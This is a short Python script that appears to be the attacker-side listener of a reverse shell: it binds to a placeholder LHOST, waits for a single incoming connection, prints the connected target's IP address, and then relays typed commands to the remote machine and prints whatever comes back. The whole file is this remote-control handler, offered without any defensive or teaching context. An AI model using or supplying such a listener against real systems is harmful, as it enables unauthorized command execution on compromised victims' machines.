import socket as sk

LHOST = 'xxx.xxx.xxx.xxx'
PORT = 0
adrs = (LHOST, PORT)


server = sk.socket(sk.AF_INET, sk.SOCK_STREAM)
server.bind(adrs)
server.listen(1)

connection, target_IP = server.accept()

connection

target_IP = list(target_IP)
print(f'CONNECTED TO {target_IP[0]} \n\n')

while True:
    command = input('> ')

    connection.send(command.encode())
    response = connection.recv(1024)
    response = response.decode(errors='ignore')
    print(response)